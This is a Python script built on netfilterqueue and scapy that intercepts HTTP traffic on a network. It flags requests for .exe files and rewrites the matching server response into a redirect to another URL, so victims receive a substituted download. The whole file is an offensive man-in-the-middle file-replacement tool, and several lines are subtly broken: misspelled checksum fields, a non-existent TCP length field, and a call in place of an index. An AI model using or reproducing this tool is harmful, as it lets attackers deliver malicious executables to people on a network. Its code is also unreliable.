#!/usr/bin/env python



import netfilterqueue
import scapy.all as scapy

acknowledge_list = []

def setting_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksm
    del packet[scapy.TCP].len
    del packet[scapy.TCP].chksm
    return packet

def pkt_process(packet):
    # converting the packet into a scapy packet for modification
    pkt_scapy = scapy.IP(packet.get_payload())
    # to check whether a packet contains the HTTP layer or not
    if pkt_scapy.haslayer(scapy.Raw):
        # checking if the destination port is 80(default port for http) means that the packet is leaving from our computer and going to port 80
        if pkt_scapy[scapy.TCP].dport == 80:
            # to check whether there is any exe file in the load field
            if ".exe" in pkt_scapy[scapy.Raw].load:
                print("[*] exe Request")
                acknowledge_list.append(pkt_scapy[scapy.TCP].ack)

        # checking if the destination port is 80(default port for http) means this is a packet is leaving from port 80
        elif pkt_scapy(scapy.TCP).sport == 80:
            if pkt_scapy[scapy.TCP].seq in acknowledge_list:
                acknowledge_list.remove(pkt_scapy[scapy.TCP].seq)
                print("[*] Replacing File ")
                modified = setting_load(pkt_scapy, "HTTP/1.1 301 Moved Permanently\nLocation: http://www.example.org/index.asp\n\n")

                packet.set_payload(str(modified))



    packet.accept()


q = netfilterqueue.NetfilterQueue()
q.bind(0, pkt_process)
q.run()

